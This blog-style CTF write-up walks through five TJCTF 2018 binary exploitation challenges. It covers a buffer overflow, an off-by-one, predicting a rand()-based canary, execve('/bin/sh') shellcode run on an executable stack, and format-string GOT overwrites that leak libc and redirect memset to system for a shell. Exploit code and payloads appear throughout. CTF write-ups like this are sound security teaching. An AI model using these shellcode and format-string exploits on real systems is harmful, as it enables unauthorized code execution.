
# TJCTF 2018 — Full Binary Exploitation Walk-through

Thomas Jefferson High School for Science and Technology

Hello, hackers!

TJCTF just finished, so I’m here to share some of my solutions on my favorite category, pwning. Our team rank was 13/1016 and I am very satisfied by our work. Let’s get started!

### Math Whiz

We have a simple binary that will show us the flag if we could become admin.

    if (admin) {
            printf("Successfully registered '%s' as an administrator account!\n", username);
            printf("Here is your flag: %s\n", FLAG);
        } else {
            printf("Successfully registered '%s' as an user account!\n", username);
        }

But the **admin** variable is not set anywhere, so we need to pwn it. It will be pretty easy as we have the source code provided. If we take a look at the input function, we observe that it reads specified size multiplied by 16. The most obvious buffer overflow is when the PIN code gets read:

    input(recoverypin, 4);

This means that we read 64 bytes in a 4-byte array. We also see that the **admin** variable is declared before the buffers, so the question is how could we override it? Lucky enough, modern compilers move buffers before any other variables in order to get them way from the return pointer, but in our case, we are in advantage. Finally, any input larger than 52 bytes will provide us this beauty: **tjctf{d4n63r0u5_buff3r_0v3rfl0w5}**

### Tilted Troop

We’ve got a binary that should read 8 team members with random strengths and simulate a battle with some fantastic creature. If the sum of strengths is our goal (400 in this case), we will get the flag. Again, we have the source code, so our life is a lot easier when we don’t have to disassemble. We see that the array of strengths is kept right after the array of names and maybe we could override somehow.

Checking how bound checks are done, we can spot a bug:

    if(t.teamSize > MAX_TEAM_SIZE)

Array indexing starts from 0, so from 0 to **MAX_TEAM_SIZE** there are **MAX_TEAM_SIZE + 1** elements. We need to create 8 members in our team and then just override the **strength** variable.

    for i in range(4):
        io.recvline()

    for i in range(8):
        io.sendline('A test')

    # this will override strength buffer
    # 'd' = 100 => 'd' * 4 = 400
    io.sendline('A dddd')
    io.sendline('F')
    io.interactive()

And here it is: **tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}**

Full solution: [https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/strover.py](https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/strover.py)

### Future Canary Lab

Again, we have to deal with variable overriding, but this time we have some kind of protection:

    // canary generation
    for (i = 0; i < 10; ++i) {
            canary[i] = check[i] = rand();
        }

    // ...

    // canary check
    for (j = 0; j < 10; ++j) {
            if (canary[j] != check[j]) {
                printf("Alas, it would appear you lack the time travel powers we desire.\n");
                exit(0);
            }
        }

If you are familiar with stack canaries (or stack cookies) you easily recognize that this is a handmade implementation. As **rand()** is not a secure function, we could reproduce its return values for sure. In the **main() **function we see that it is initialized with the seed of current time, so it is pretty vulnerable. Using the current time when we connect to the server as the seed, we can generate the values from the canary. Here we have a little C program to generate 10 random values based on our seed:

    int main(int argc, char **argv)
    {
        int seed = atoi(argv[1]);
        srand(seed);

    for (int i = 0; i <= 9; i++) {
            printf("%d\n", rand());
        }

    return 0;
    }

Now, as we bypassed the canary, we need to satisfy the following condition:

    if (secret - i + j == 0xdeadbeef)

**secret** is always 0, **i** could be overridden by us and **j** is always 10, so we need to override **i** with 0x2152411b to solve the equation.

At the end we have: **tjctf{3l_p5y_k0n6r00_0ur_n3w357_l4b_m3mb3r!}**

Full solution: [https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/interview.py](https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/interview.py)

We were given a small demo banking system. We have the source code, so a vulnerability will be pretty easy to spot. At first it looks pretty secure, but if we take a look at the **verify_pin()** function we see a clear buffer overflow. Let’s run a **checksec** to see what protection does this binary implies:

    [littlewho@sweethome tjctf2018]$ checksec problem
    [*] '/home/littlewho/ctfs/tjctf2018/problem'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments

It does not have any stack canary or any other execution prevention, so the solution is straightforward. The **name** array is global so it is stored in the **BSS** section and we know its address: 0x6010A0. We could store our shellcode here and then use the overflow to jump here.

    ; execve(["/bin/sh",], [], [])

    bits 64
        push 0x68
        mov rax, 0x732f2f6e69622f2f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        xor r10, r10
        mov rax, 0x3b
        syscall

Compile it as raw binary using **nasm** in order to easily use it. The layout of the attack vector is:

    4 chars for PIN + 13 bytes to fill the buffer and the RBP + RIP

![Running the exploit](https://cdn-images-1.medium.com/max/2000/1*xJn5jD9ReniOoQ21SPMZDQ.png)*Running the exploit*

Flag: **tjctf{d4n6_17_y0u_r0pp3d_m3_:(}**

Full solution: [https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/problem.py](https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/problem.py)

### Secure Secrets

Challenges until now were pretty easy, the real fun starts now. Don’t get scary, they are still easy, but they need a little bit more amount of work than others as we don’t have the source code anymore and we need to do format string exploitation.

![Running the application](https://cdn-images-1.medium.com/max/2000/1*Gsslm7YmAduWdkBxAc1u2A.png)*Running the application*

This is how the application looks. It just reads a password and a message then shows the message. Let’s open the binary in IDA Pro (or Hopper). Both of them could generate pseudo-code of the program (press F5 in IDA or search in top menu of Hopper), but for now let’s analyze some Assembly.

We don’t see any buffer overflow, but the following code from **get_message()** looks interesting:

    .text:0804885D                 mov     eax, [ebp+arg_0]
    .text:08048860                 mov     [ebp+var_2C], eax

    ...

    .text:080488EC                 push    [ebp+var_2C]    ; format
    .text:080488EF                 call    _printf
    .text:080488F4                 add     esp, 10h

**var_2C** is the argument passed to the function and it represents our message and it is passed directly to **printf()** and that means: format string vulnerability! The scenario could be classic: leak libc, overwrite some function GOT with system, pass “/bin/sh” to it and get the flag, but it is even easier, after investigating the binary a little bit more we see another function named **get_secret()** that has some pretty interesting code in it:

    .text:08048727                 push    offset modes    ; "r"
    .text:0804872C                 push    offset filename ; "flag.txt"
    .text:08048731                 call    _fopen

So it is clear, we need to overwrite some GOT entry with the address of this function. I will chose **puts() **as it is called after our exploit few times. We need to write 0x08048713 (get_secret) at 0x0804A028 (puts@got) in order to get the flag. We will use 2 writes of 2 bytes. (if you are not familiar with this type of exploit read [this](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/9/06_lecture.pdf) and watch [this](https://www.youtube.com/watch?v=0WvrSfcdq1I)) Before we craft our exploit, we need to know where our controlled is in order to pop addresses from it. If we set a breakpoint before the printf at 0x080488EF and dump the stack, we will see that **%35$x** is our buffer.

This is a short explanation for those who don’t understand how I got that number. Open the executable in GDB and put a breakpoint at that printf. Input something like this in the message: *AAAABBBB %x %x %x *and now continue. When the breakpoint is hit, dump the stack then step to the next instruction. The printf output will be something like:

    AAAABBBB ffffc5ec f7fa05c0 fbad2887

Now let’s search those values in the stack dump.

![Stack dump](https://cdn-images-1.medium.com/max/2000/1*7zLfLJ5ivI6oU7k4DL_EQQ.png)*Stack dump*

In the first square, we have the dumped values by printf and in the second one the actual buffer. The distance from first printed argument to the buffer is of 35 arguments. So, when we will want to overwrite few addresses using **%n **format argument, we will put those addresses at the beginning of our buffer and we will use **%<arg>$n** syntax to access them. Let’s proceed further.

Using python I generated the payload in a pretty manner:

    arg_off = 35
    puts_GOT = 0x0804A028
    get_secret_ADDR = 0x08048713

    write1 = 0x0804 - 8
    write2 = 0x8713 - write1 - 8

    payload = p32(puts_GOT + 2) + p32(puts_GOT) + "%{}x%{}$hn%{}x%{}$hn".format(write1, arg_off, write2, arg_off + 1)

First we write the bytes with a smaller value and then the rest. After running it we get: **tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}**

Full solution: [https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/secure.py](https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/secure.py)

### Super Secure Secrets

![Running the application](https://cdn-images-1.medium.com/max/2000/1*jYqBs90glKWfLIOGi59T-A.png)*Running the application*

We have almost the same challenge, but with improved security, so let’s do some standard checks.

![Checks](https://cdn-images-1.medium.com/max/3814/1*4CiKImnf_SoR9ph6jGpR2A.png)*Checks*

Now, there is no **get_secret()** function, we have no buffer overflow, but we still have the same format string vulnerability in the view message functionality. We need to follow a classic scenario:

* Leak LIBC address

* Overwrite GOT entry of some function with **system()** address

* Pass “/bin/sh” address from LIBC or find other way to pass “sh” to the overwritten function

* Now you have the shell, so profit.

Leaking the libc implies dumping the stack before the printf and investigate if we have any libc address that could be accessed by our **%<arg>$p** trick. As we are using a 64-bit binary, first 5 arguments are passed using registers, so stack arguments start at 6. Let’s use *%6$p %7$p %8$p *to dump few values:

    0x7fffffffd390 0x7fffffffd3b0 0x100000000

![Leaked arguments](https://cdn-images-1.medium.com/max/2000/1*i2IP8HWaqDClWmR-J2vCcw.png)*Leaked arguments*

Here we have the values we printed. Looking ahead we see this:

![LIBC address onto the stack](https://cdn-images-1.medium.com/max/2000/1*C2I9ZAtFqzJOyKfN8B_B1Q.png)*LIBC address onto the stack*

By dividing 0x1d8 offset by pointer size on 64-bit arch (8 bytes) we get the position 65. So at **%65$p** we have **__libc_start_main+<some_offset>** and we can leak the base address of libc. Now, we have to problems ahead:

* When need to know the version of libc used on the server in order to create a working exploit

* The program closes after we view the message and we can’t continue our exploit

Let’s solve them one by one. So, we have two options to get the version of libc, first would be to leak the argument 65 on the webserver, take its signature (last 3 digits) and use [https://libc.blukat.me/](https://libc.blukat.me/) or [https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database) to find the version. In that case, the leaked address is 0x7fdf0a8a7b97 (it changes every time, only the last digits remain, this is just an example) and its signature is **b97**. The second option is to use an already solved pwn challenge to connect to the server and leak the libc version, it is not very fair play, but remember this trick, it is very useful in some CTFs with esoteric libc versions.

Both solutions lead to the same answer: **libc6_2.27–3ubuntu1_amd64**

![Searching for the libc](https://cdn-images-1.medium.com/max/2332/1*3J2fUcT2pE7JfEVP6dcYuQ.png)*Searching for the libc*

The offset of specified symbol is 0x21b97, so now we have the base address when we want, but we still need to force the program not to close. Let’s investigate the code after we run our exploit. (I used IDA to decompile)

    unsigned __int64 __fastcall get_message(char *a1, const char *a2) {

    // ... code before this is not relevant
    printf(a1, &s, a2);
      puts("====================");
      for ( i = 0; i <= 5; ++i )
        v4[i] = byte_401238[rand() % 62];
      v5 = 0;
      puts("As a free trial user, please complete the following captcha for our monitoring purposes.");
      printf("Captcha: %s\n", v4);
      fgets(&s2, 7, stdin);
      if ( !strcmp(v4, &s2) )
      {
        puts("Thank you for your cooperation...");
      }
      else
      {
        memset(a1, 0, 0x80uLL);
        puts("Incorrect captcha, your message was removed from our database.");
      }
      return __readfsqword(0x28u) ^ v8;
    }

After this function returns, the program closes. The simplest solution is to overwrite the GOT of a function that is called before the exit and return to the beginning of the program. As **memset()** is not used in the rest of the program let’s rewrite its GOT with 0x400DA0 (the address where the menu is printed and the interaction starts).

Crafting the payload is a little bit tricky, we are now on 64-bit and addresses has a lot of zero bytes, so we can’t add them at the beginning of our message because that would end the printf. We could add them at the end, but in my case I chosen to add them in the password buffer and use them from there.

After leaking the right offsets, we can craft the following vector that will leak libc and will overwrite **memset@got**.

    # addresses

    memset_GOT = 0x602050
    secure_service_ADDR = 0x400DA0

    # payload that leaks libc and rewrite memset() GOT to secure_service()
    # write zeros at the first 4 bytes and the address in the last 4
    # also, we will store the addresses where we write in the password buffer

    off = 22      # offset of password buffer
    leak_off = 65 # offset of __libc_start_main_ret on the stack
    payload = "%{}$n%{}${}p%{}$n".format(off + 1, leak_off, secure_service_ADDR, off)

    ...
    leaked_libc = stack_leak_address - 0x21b97 # calculate the base

The next step is to get the shell. We see that **memset()** is called with our message as the first argument, so if we replace it with **system()** and add at the beginning of our message “sh || ”, then we will get a shell and the errors from the rest of the string will be ignored. So, let’s write the payload:

    # payload that rewrites memset() GOT to system()
    write1 = (0xffff00000000 & system_ADDR) / 0x100000000
    write2 = (0x0000ffff0000 & system_ADDR) / 0x10000
    write3 = (0x00000000ffff & system_ADDR)

    # sort the writes in ascending order
    writes = [
                (write1, p64(memset_GOT + 4)),
                (write2, p64(memset_GOT + 2)),
                (write3, p64(memset_GOT + 0))
                ]
        writes.sort(key=lambda tup: tup[0])
        print (writes)

    addresses = ''.join(x[1] for x in writes)
    write3 = writes[0][0]
    write2 = writes[1][0]
    write1 = writes[2][0]

    code = "sh || "
    payload = code + "%{}x%{}$hn%{}x%{}$hn%{}x%{}$hn".format(write3 - len(code), off, write2 - write3, off + 1, write1 - write2, off + 2)

Running the full script will have great results:

![Running the exploit](https://cdn-images-1.medium.com/max/2426/1*54kZjI5GQSPxQS5Zze-dGQ.png)*Running the exploit*

Flag: **tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}**

Full solution: [https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/super_secure.py](https://github.com/JustBeYou/ctfs/blob/master/tjctf2018/super_secure.py)

And here we are, at the end of the journey. We pwned them all! TJCTF was a great experience with pretty interesting tasks that were beginner oriented, so I recommend it to any newcomer as the organizers did a really great job to assure a high quality CTF.

Don’t forget to subscribe and follow my Github for more wargames solutions and guides. Thanks for reading!
